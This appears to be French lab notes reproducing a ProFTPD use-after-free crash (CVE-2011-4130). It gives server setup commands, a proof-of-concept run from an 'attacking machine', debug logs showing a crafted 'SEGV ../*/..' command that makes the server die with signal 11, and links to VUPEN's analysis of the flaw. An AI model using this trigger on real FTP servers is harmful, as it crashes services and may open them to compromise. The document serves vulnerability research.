Sur vtcsec :
sudo su
echo "DenyFilter \*.*/" >> /usr/local/etc/proftpd.conf
killall proftpd
proftpd -n -d 20

Sur la machine attaquant :
python3 poc.py

Dans les logs de ProFTPd :

vtcsec (192.168.145.136[192.168.145.136]) - USER marlinspike: Login successful.
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'PASV' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'PASV' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - dispatching CMD command 'PASV' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - in dir_check_full(): path = '/', fullpath = '/home/marlinspike/'.
vtcsec (192.168.145.136[192.168.145.136]) - Entering Passive Mode (192,168,145,138,179,81).
vtcsec (192.168.145.136[192.168.145.136]) - dispatching LOG_CMD command 'PASV' to mod_log
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'RETR latest.tar.gz' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'RETR latest.tar.gz' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'RETR latest.tar.gz' to mod_xfer
vtcsec (192.168.145.136[192.168.145.136]) - in dir_check_full(): path = '/latest.tar.gz', fullpath = '/home/marlinspike/latest.tar.gz'.
vtcsec (192.168.145.136[192.168.145.136]) - dispatching CMD command 'RETR latest.tar.gz' to mod_xfer
vtcsec (192.168.145.136[192.168.145.136]) - passive data connection opened - local  : 192.168.145.138:45905
vtcsec (192.168.145.136[192.168.145.136]) - passive data connection opened - remote : 192.168.145.136:39104
vtcsec (192.168.145.136[192.168.145.136]) - declining use of sendfile for ASCII data
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'SEGV ../*/..' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - dispatching PRE_CMD command 'SEGV ../*/..' to mod_core
vtcsec (192.168.145.136[192.168.145.136]) - 'SEGV ../*/..' denied by DenyFilter
vtcsec (192.168.145.136[192.168.145.136]) - dispatching LOG_CMD_ERR command 'SEGV ../*/..' to mod_log
vtcsec (192.168.145.136[192.168.145.136]) - Transfer aborted after 16384 bytes in 0.00 seconds
vtcsec (192.168.145.136[192.168.145.136]) - notice: user marlinspike: aborting transfer: Broken pipe
vtcsec (192.168.145.136[192.168.145.136]) - ProFTPD terminating (signal 11)
vtcsec (192.168.145.136[192.168.145.136]) - ProFTPD terminating (signal 11)
vtcsec (192.168.145.136[192.168.145.136]) - FTP session closed.


https://web.archive.org/web/20120415151731/http://www.vupen.com/blog/20120110.Technical_Analysis_of_ProFTPD_Remote_Use_after_free_CVE-2011-4130_Part_I.php
https://web.archive.org/web/20120427100556/http://www.vupen.com/blog/20120116.Advanced_Exploitation_of_ProFTPD_Remote_Use_after_free_CVE-2011-4130_Part_II.php